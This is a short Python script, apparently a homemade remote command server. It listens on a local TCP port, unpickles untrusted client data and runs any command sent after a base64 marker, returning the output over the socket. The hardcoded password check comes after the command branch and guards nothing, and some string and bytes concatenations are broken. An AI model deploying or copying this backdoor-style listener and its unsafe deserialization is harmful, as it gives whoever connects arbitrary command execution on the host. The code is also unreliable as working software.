import pickle as pickle
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 6666))
s.listen(100)
try:
 conn, addr = s.accept()
except KeyboardInterrupt:
    exit()
print('connection from: ' + str(addr))


def main():
        try:
            raw_data = conn.recv(1024)
            data = pickle.loads(raw_data)
            if str(data).startswith('Y29tbWFuZA=='):
                raw_command = str(data).split('Y29tbWFuZA==')[1]
                print(raw_command)
                command = raw_command.split(' ')
                print('executing: ' + command)
                output = subprocess.check_output(command)
                conn.send('b3V0cHV0Cg==' + output)
                return
            else:
                pass
            if data == 'a_ha':
                conn.send(pickle.dumps('correct'))
                print('correct password')
                return
            else:
                conn.send(pickle.dumps('incorrect'))
                print('wrong password')
                return
        except KeyboardInterrupt:
            s.close()
            print('Connection Closed')
            exit()
if __name__=='__main__':
 while True:
  main()
